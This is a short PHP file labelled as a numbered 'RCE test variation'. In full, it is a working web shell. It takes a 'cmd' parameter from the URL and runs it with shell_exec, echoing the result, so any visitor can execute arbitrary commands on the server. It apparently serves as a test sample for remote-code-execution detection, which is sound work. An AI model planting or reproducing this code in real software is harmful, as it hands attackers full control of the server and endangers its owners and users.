<?php
// RCE test variation #1371
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>